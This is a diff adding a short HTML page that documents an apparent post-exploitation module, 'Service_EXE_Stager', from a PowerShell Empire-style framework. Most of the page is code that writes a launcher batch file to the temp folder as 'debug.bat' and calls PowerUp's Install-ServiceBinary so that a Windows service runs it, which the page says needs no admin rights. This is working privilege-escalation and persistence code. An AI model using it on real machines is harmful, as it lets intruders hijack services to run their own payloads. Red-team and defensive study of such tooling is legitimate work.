@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Service_EXE_Stager</title>
+</head><body>Backs up a service's binary and replaces the original with a binary that launches a stager.bat<br/>
+Does not need Admin<br/>
+<br/>
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br/>
+moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1<br/>
+<br/>
+# PowerShell code to write the launcher.bat out<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; scriptEnd = ";$tempLoc = \"$env:temp\\debug.bat\""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"<br/>
+scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"<br/>
+<br/>
+scriptEnd += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""<br/>
+<br/>
+</body></html>
